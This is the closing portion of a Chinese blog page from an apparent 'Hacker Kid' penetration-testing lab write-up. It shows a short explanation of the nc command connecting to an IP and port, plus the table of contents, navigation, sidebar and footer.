+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 命令是 Kali Linux（也适用于其他许多 Linux 发行版）中的一个网络工具，用于创建 TCP/IP 连接、监听端口，或者进行网络调试和数据传输。它是一个非常灵活的工具，具有多种用途。</span><br><span class="line"></span><br><span class="line">在你提到的情境中，nc 命令后跟着的 ip 是目标主机的 IP 地址，端口 是目标主机上打开的端口号。这个命令告诉 nc 命令建立到指定 IP 地址和端口的网络连接。</span><br><span class="line"></span><br><span class="line">示例：nc 192.168.0.1 8080 - 这个命令告诉 nc 去连接 IP 地址为 192.168.0.1 的主机的 8080 端口。</span><br></pre></td></tr></table></figure>
+
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hcaker-Kid-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">Hcaker Kid 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilitie%E6%8F%90%E6%9D%83"><span class="toc-text">Capabilitie提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/2023/11/16/Hacker-Kid/">http://example.com/2023/11/16/Hacker-Kid/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2023/11/14/Lab-6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          反序列化、XXE、暴力破解、逻辑漏洞
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/16/Hacker-Kid/">Hacker Kid</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Lab-6/">反序列化、XXE、暴力破解、逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu渗透测试</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/test/">来了老弟</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023年</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example1.com/">site-name1</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example2.com/">site-name2</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example3.com/">site-name3</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2023 bigbigwolf.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
